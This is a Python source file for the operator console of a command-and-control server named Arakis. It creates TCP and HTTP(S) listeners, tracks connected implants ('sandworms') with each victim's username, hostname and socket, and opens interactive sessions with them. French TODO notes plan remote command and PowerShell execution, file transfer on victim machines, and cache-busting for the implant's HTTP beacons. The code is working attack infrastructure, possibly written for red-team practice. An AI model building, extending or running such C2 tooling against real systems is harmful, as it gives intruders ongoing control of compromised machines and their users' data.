import cmd
import logger
import threading
from listeners.tcp_server import CustomTCPServer
from colorama import Fore, Style
from CLI.sandworms import TCPSandwormCLI, HTTPSandwormCLI  # Import the nested CLI
from listeners.custom_http import HTTPHandler, HTTPServerWrapper
import signal


TEMP_CERT_FILE = "certificates/cert.pem"
TEMP_KEY_FILE = "certificates/key.pem"


class ArakisCLI(cmd.Cmd):
    """
    Interactive CLI for managing the Python C2 Server
    """

    intro = "Welcome to Arakis🐍. Type help or ? to list commands."
    prompt = "(Arakis)> "

    def __init__(self, verbosity="error"):
        super().__init__()
        self.log = logger.Logger(verbosity=verbosity)
        
        self.tcp_listeners = {} # Indexed by ID, values are a tuple (CustomTCPServer, ID)
        self.tcp_listeners_count = 0

        self.http_listeners = {} # Indexed by ID, values are a tuple (HTTPServerWrapper, ID)
        self.http_listeners_count = 0

        self.tcp_sandworms = {} # Connected TCP clients
        self.http_sandworms = {} # Connected HTTP clients
        self.current_sandworm = None # Active client session


        self.log.info(f"Verbosity level set to: {verbosity}")

    # On override le emptyline pour que quand on rentre "enter" sans aucune commande
    # ca exécute automatiquement la dernière commande lancée
    def emptyline(self):
        """Override emptyline to prevent repeating the last command."""
        pass


    def default(self, line):
        """
        Overrides default cmd behavior to parse hierarchical commands
        """
        args = line.split()
        if not args:
            return
        
        main_cmd = args[0]
        sub_cmd = args[1] if len(args) > 1 else None
        sub_args = args[2:]

        if main_cmd == "tcp":
            self.handle_tcp_commands(sub_cmd, sub_args)
        
        elif main_cmd == "sandworm":
            self.handle_sandworm_commands(sub_cmd, sub_args)
        elif main_cmd == "http":
            self.handle_http_commands(sub_cmd, sub_args)
        else:
            self.log.error(f"Unkown command: {line}. Type 'help' for usage.")
            print(Fore.YELLOW + f"[-] Unkown command: {line}." + Style.RESET_ALL + "Type 'help' for usage")


    ### TCP COMMANDS ###
    def handle_tcp_commands(self, sub_cmd, args):
        """
        wrapper for all tcp related commands. Options : list, create, start, remove, stop.
        Example: tcp list
        """
        if sub_cmd == "list":
            self.list_tcp_listeners()
        
        elif sub_cmd == "create" and len(args) == 2:
            self.create_tcp_listener(args[0], args[1])
        
        elif sub_cmd == "remove" and len(args) == 1:
            self.remove_tcp_listener(args[0])
        
        elif sub_cmd == "start" and len(args) == 1:
            self.start_tcp_listener(args[0])
        
        elif sub_cmd == "help":
            self.tcp_help()

        else:
            self.log.error(f"Invalid TCP command. Use: 'tcp help' if needed.")
            print(Fore.YELLOW + f"[-] Invalid TCP command. " + Style.RESET_ALL + "")
            print("Use: 'tcp help' if needed.")


    def create_tcp_listener(self, ip, port):
        """
        setup_tcp_listener <interface> <port> - Setup a listening TCP server
        Example: setup_tcp_listener 0.0.0.0 8888
        """
        try:
            interface, port = ip, int(port)
            index = self.tcp_listeners_count
            listener = CustomTCPServer(interface, port, index, self.on_new_tcp_sandworm)

            
            self.tcp_listeners[index] = (listener,index)
            self.tcp_listeners_count+=1
            
            self.log.info(f"Setting up TCP listener on {interface}:{port} with index {index}. Use start_tcp_listener to start it")
            print(Fore.GREEN + f"[+] Setting up TCP listener on {interface}:{port} with index {index}." + Style.RESET_ALL)

        except ValueError:
            self.log.error("Invalid tcp create arguments (interface or port)")
            print(Fore.YELLOW + "[-] Invalid tcp create arguments (interface or port)" + Style.RESET_ALL)


    def start_tcp_listener(self, index):
        """
        start_tcp_listener <index> - Start the tcp listener indexed <index>
        Example: start_tcp_listener 1
        """
        try:
            index = int(index)
            listener,_ = self.tcp_listeners[index]
            
            if not listener:
                self.log.error(f"No TCP listener found at index {index}. Use 'list_tcp_listeners")
                return
            
            self.log.info(f"Starting TCP listener {index}...")
            print(Fore.GREEN + f"[+] Starting TCP listener {index}..." + Style.RESET_ALL)
            thread = threading.Thread(target=listener.listen, daemon=True)
            thread.start()

        except ValueError:
            self.log.error("Invalid index. Ensure you provide a valid integer.")
            print(Fore.YELLOW + "[-] Invalid index. Ensure you provide a valid integer." + Style.RESET_ALL)


    def remove_tcp_listener(self, index):
        """
        remove_tcp_listener <id> - Remove TCP listener by id
        Example : remove_tcp_listener 0
        """
        try:
            index = int(index)
            listener,_ = self.tcp_listeners[index]

            if not listener:
                self.log.error(f"No TCP listener found at index {index}. Use 'list_tcp_listeners.")
                print(Fore.YELLOW + f"[-] No TCP listener found at index {index}. Use 'list_tcp_listeners." + Style.RESET_ALL)
                return
            
            if listener.running:
                listener.stop()

            del self.tcp_listeners[index]
            self.log.warning(f"Removed TCP listener {index}")
            print(Fore.GREEN + f"[+] Removed TCP listener {index}" + Style.RESET_ALL)

        except ValueError:
            self.log.error("Invalid index. Ensure you provide a valid integer.")

    
    def list_tcp_listeners(self):
        """
        list_tcp_listeners - List all currently configured TCP listeners
        Example : list_tcp_listeners
        """
        if not self.tcp_listeners:
            self.log.info("No active TCP listeners")
            print(Fore.YELLOW + f"[-] No active TCP listeners" + Style.RESET_ALL)
            return
        
        print(Fore.GREEN + f"[+] TCP listener actives :" + Style.RESET_ALL)
        for index, listener_tuple in self.tcp_listeners.items():
            listener = listener_tuple[0]
            self.log.info(f"[{index}] TCP listener on {listener.IP}:{listener.PORT}")
            print(Fore.YELLOW + f"[{index}] {listener.IP}:{listener.PORT} ({'running' if listener.running else 'idle'})" + Style.RESET_ALL)


    def tcp_help(self):
        """
        help [command] - Show detailed help for a command.
        Example: tcp help
        """
        print("\nAvailable Commands:")
        print("  tcp help                - This help message")
        print("  tcp start <index>       - Start an existing TCP listener")
        print("  tcp remove <id>         - Remove a TCP listener")
        print("  tcp list                - List all TCP listener")
        print("  tcp create <ip> <port>  - Create a new TCP listener")
        print("  exit                    - Exit the CLI\n")

    
    def http_help(self):
        """
        help [command] - Show detailed help for a command.
        Example: http help
        """
        print("\nAvailable Commands:")
        print("  http help                - http help message")
        print("  http start <index>       - Start an existing HTTP listener")
        print("  http remove <id>         - Remove a HTTP listener")
        print("  http list                - List all HTTP listener")
        print("  http create <ip> <port>  - Create a new HTTP listener")
        print("  exit                    - Exit the CLI\n")


    def handle_http_commands(self, sub_cmd, args):
        """
        wrapper for all tcp related commands. Options : list, create, start, remove, stop.
        Example: tcp list
        """
        if sub_cmd == "list":
            self.list_http_listeners()
        

        # TODO juste faire en sorte que de pas devoir spécifier secure, mais https à la place
        elif sub_cmd == "create":
            if "secure" in args:
                self.create_http_listener(args[0], args[1], secure=True)

            else:
                self.create_http_listener(args[0], args[1], secure=False)
        
        elif sub_cmd == "remove" and len(args) == 1:
            self.remove_http_listener(args[0])
        
        elif sub_cmd == "start" and len(args) == 1:
            self.start_http_listener(args[0])
        
        elif sub_cmd == "help":
            self.http_help()

        else:
            self.log.error(f"Invalid TCP command. Use: 'tcp help' if needed.")
            print(Fore.YELLOW + f"[-] Invalid TCP command. " + Style.RESET_ALL + "")
            print("Use: 'tcp help' if needed.")

    def create_http_listener(self, ip, port, secure=False, certfile=TEMP_CERT_FILE, keyfile=TEMP_KEY_FILE):
        """
        TODO : Pas obligé de spécifier secure si tu donne certfile et keyfile
        http create <interface> <port> <secure> <certfile> <keyfile> - Setup a listening HTTP server
        Example: http create 0.0.0.0 8888
        """
        try:
            interface, port = ip, int(port)
            index = self.http_listeners_count

            http_listener = HTTPServerWrapper(
                (interface, port),
                HTTPHandler,
                self.on_new_http_sandworm,
                index,
                secure,
                certfile,
                keyfile
            )

            self.http_listeners[index] = (http_listener, index)
            self.http_listeners_count+=1

            self.log.info(f"Setting up HTTP listener on {interface}:{port} with index {index}")
            print(Fore.GREEN + f"[+] Setting up HTTP listener on {interface}:{port} with index {index}." + Style.RESET_ALL)

        except ValueError:
            self.log.error("Invalide http create arugments.")
            print(Fore.YELLOW + "[-] Invalid http create arguments" + Style.RESET_ALL)


    def start_http_listener(self, index):
        """
        http start <index> - Start the http listener indexed <index>
        Example: http start 1
        """
        try:
            index = int(index)
            listener,_ = self.http_listeners[index]

            if not listener:
                self.log.error(f"No HTTP listener found at index {index}.")
                return
            
            self.log.info(f"Starting HTTP listener {index}...")
            print(Fore.GREEN + f"[+] Starting HTTP listener {index}..." + Style.RESET_ALL)
            thread = threading.Thread(target=listener.start, daemon=True)
            thread.start()

        except ValueError:
            self.log.error("Invalid index.")
            print(Fore.YELLOW + "[-] Invalid index.")


    def remove_http_listener(self, index):
        """
        http remove <id> - Remove HTTP listener by id
        Example : http remove 0
        """
        try:
            index = int(index)
            listener,_ = self.http_listeners[index]

            if not listener:
                self.log.error(f"No HTTP listener found at index {index}")
                print(Fore.YELLOW + f"[-] No HTTP listener found at index {index}" + Style.RESET_ALL)
                return
            
            if listener.running:
                listener.stop()

            del self.http_listeners[index]
            self.log.warning(f"Removed HTTP listener {index}")
            print(Fore.GREEN + f"[+] Removed HTTP lsitener {index}" + Style.RESET_ALL)

        except ValueError:
            self.log.error("Invalid index.")


    def list_http_listeners(self):
        """
        http list - List all currently configured HTTP listeners
        Example : http list
        """
        if not self.http_listeners:
            self.log.info("No active HTTP listeners")
            print(Fore.YELLOW + f"[-] No active HTTP listeners" + Style.RESET_ALL)
            return
        
        print(Fore.GREEN + f"[+] HTTP listener actives :" + Style.RESET_ALL)
        for index, listener_tuple in self.http_listeners.items():
            listener = listener_tuple[0]
            self.log.info(f"[{index}] HTTP listener on {listener.ip}:{listener.port}")
            print(Fore.YELLOW + f"[{index}] {listener.ip}:{listener.port} ({'running' if listener.running else 'idle'})" + Style.RESET_ALL)


    ### SANDWORM COMMANDS ###
    def handle_sandworm_commands(self, sub_cmd, args):
        if sub_cmd == "list":
            self.list_sandworms()
        
        elif sub_cmd == "interact" and len(args) == 2:
            self.interact_with_sandworm(args[0], args[1])

        elif sub_cmd == "help":
            self.sandworm_help()

        else:
            self.log.error("Invalid Sandworm command.")


    def list_sandworms(self):
        """
        List all connected sandworms
        """

        if not self.tcp_sandworms and not self.http_sandworms:
            print(Fore.YELLOW + "[-] No active sandworm" + Style.RESET_ALL)
            return
        
        print(Fore.GREEN + "[+] Connected Sandworms :" + Style.RESET_ALL)
        print("[=>] TCP Sandworms : ")
        for index, client in self.tcp_sandworms.items():
            print(Fore.YELLOW + f"[{index}]  Sandworm : {client['username']}@{client['hostname']}" + Style.RESET_ALL)

        print("[=>} HTTP Sandworms : ")
        for index, client in self.http_sandworms.items():
            print(Fore.YELLOW + f"[{index}]  Sandworm : {client['sandworm_index']}@{client['ip']}" + Style.RESET_ALL)


    def interact_with_sandworm(self, index, type="tcp"):
        """
        Switch to interacting with a specific Sandworm
        """
        try:
            index = int(index)
            
            if type == "tcp":
                if index not in self.tcp_sandworms:
                    self.log.error(f"Sandworm [{index}] not found.")
                    return
                
                sandworm = self.tcp_sandworms[index]
                sandworm_cli = TCPSandwormCLI(index, sandworm, self)
                sandworm_cli.cmdloop() # Start nested CLI
            
            elif type == "http":

                if index not in self.http_sandworms:
                    self.log.error(f"Sandworm [{index}] not found.")
                    return
                
                sandworm = self.http_sandworms[index]
                sandworm_cli = HTTPSandwormCLI(index, sandworm, self)
                sandworm_cli.cmdloop() # Start nested CLI
            
            else:
                pass

        except ValueError:
            self.log.error("Invalid index")

    
    def sandworm_help(self):
        """
        help [command] - Show detailed help for a command.
        Example: help setup_tcp_listener
        """
        print("\nAvailable Commands:")
        print("  sandworm help                  - sandworm help message")
        print("  sandworm list                  - list connected sandworms")
        print("  sandworm interact <type> <id>  - interact with specified sandworm (type = http or tcp)")
        print("  sandworm delete <id>           - delete the specified sandworm")
        print("  exit                           - Exit the CLI\n")

    
    ### CALLBACK FUNCTION FOR NEW TCP SANDWORM ###
    def on_new_tcp_sandworm(self, index, hostname, username, client_socket, tcp_listener_index):
        """
        This function is called when a new Sandworm connects.
        """
        
        print("\n" + Fore.GREEN + f"[+] New Sandworm connected {username}@{hostname}!" + Style.RESET_ALL)

        self.tcp_sandworms[index] = {
            "socket": client_socket,
            "hostname": hostname,
            "username": username,
            "tcp_index": tcp_listener_index
        }


    ### CALLBACK FUNCTION FOR NEW HTTP SANDWORM ###
    def on_new_http_sandworm(self, index, uuid, client_ip, secure, sandworm_index):
        """
        This function is called when a new HTTP sandworm connects
        """
        print("\n" + Fore.GREEN + f"[+] New Sandworm connected {client_ip}!" + Style.RESET_ALL)

        self.http_sandworms[index] = {
            "uuid":uuid,
            "ip":client_ip,
            #"hostname":hostname,
            #"username":username,
            "secure":secure,
            "sandworm_index":sandworm_index
        }

    
    ### CALLBACK FUNCTION WHEN CLIENT DISCONNECT (Pas encore mise au point, TODO)
    def del_sandworm(self, index, type="tcp"):
        """
        Delete the specified sandworm
        Example: sandworm delete 1
        """
        # TODO, peut-être que ca sera pas ca non plus, jsuis pas sur de celle-là
        
        
        # TODO s'assurer qu'il y a une référence entre le sandworm et le serveur tcp
        # parce qu'on doit pouvoir fermer la connexion quand on détruit le sandworm
        
        if type == "tcp":
            del self.tcp_sandworms[index]
        elif type == "http":
            del self.http_sandworms[index]
        else:
            print(Fore.RED + "[-] Not a valid type (HTTP or TCP)" + Style.RESET_ALL)

    def do_help(self, arg):
        """
        Custom help command to list hierarchical commands.
        """
        if arg:
            cmd.Cmd.do_help(self, arg)
        else:
            print("\nAvailable Commands:")
            print("  tcp help                - tcp help message")
            print("  tcp start <index>       - Start an existing TCP listener")
            print("  tcp remove <id>         - Remove a TCP listener")
            print("  tcp list                - List all TCP listener")
            print("  tcp create <ip> <port>  - Create a new TCP listener")
            print("  http help                - http help message")
            print("  http start <index>       - Start an existing HTTP listener")
            print("  http remove <id>         - Remove a HTTP listener")
            print("  http list                - List all HTTP listener")
            print("  http create <ip> <port>  - Create a new HTTP listener")
            print("  sandworm help           - sandworm help message")
            print("  sandworm list           - list connected sandworms")
            print("  sandworm interact <type> <id>  - interact with specified sandworm (type = http or tcp)")
            print("  exit                    - Exit the CLI\n")



    def do_exit(self, arg):
        """
        exit - Exit the CLI
        """
        print("Exiting Arakis CLI. - " + Fore.CYAN + " May Thy Knife Chip & Shatter!" + Style.RESET_ALL)
        return True
    

    def stop_listeners(self):
        """
        Stop all listeners
        """
        for _, listener in self.tcp_listeners.items():
            listener[0].stop()
        
        for _, listener in self.http_listeners.items():
            listener[0].stop()


    def signal_handler(self, sig, frame):
        """
        Handle SIGINT signal
        """
        self.stop_listeners()
        self.do_exit(None)


    def run(self):
        signal.signal(signal.SIGINT, self.signal_handler)
        self.cmdloop()
            
""" TODO

Ajouter un attribut aux sandworm pour dire le dernier moment qu'ils était actif
    - Avoir une fonction qui probe périodiquement les victimes et ajuste l'attribut
        - La fonction handle_client dans tcp_server ?
    (Pas prioritaire du tout) - Imprimer les sandworm inactifs depuis plus de 2min en rouge quand tu les listes

    
Penser à peut-être modifier la structure du fichier tcp_server
    - Peut-être que ca serait mieux de mettre les fonction clientes dans un autre fichier


Faire une option pour lister les serveurs
    - HTTP


Faire des options pour interagir avec le système distant
    - upload_file
    - download file
    - execute cmd
    - execute powershell


Faire une option pour exécuter des commandes locales
    - cat
    - ls
    - id
    - cd
    - etc.


IMPORTANT : 
- Dans ton http, faire en sorte que ton client envoie toujours un paramètre aléatoire pour empêcher qu'il se fasse retourner une réponse du cache

"""
if __name__ == '__main__':
    ArakisCLI().run()